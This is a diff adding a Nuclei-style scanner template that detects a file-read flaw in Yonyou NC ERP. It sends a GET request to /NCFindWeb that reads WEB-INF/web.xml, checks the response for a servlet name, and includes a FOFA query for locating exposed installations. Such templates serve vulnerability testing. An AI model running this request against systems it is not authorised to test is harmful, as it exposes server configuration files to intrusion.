@@ -1,0 +1,24 @@
+id: yongyou-nc-ncfindweb-file-read
+
+info:
+  name: Yongyou NC File Read
+  author: zp857
+  severity: high
+  tags: yongyou-nc,lfi
+  metadata:
+    fofa-query: 'app="Yonyou-ERP-NC" || title="YONYOU NC"'
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<servlet-name>NCInvokerServlet</servlet-name>"
+
+      - type: status
+        status:
+          - 200
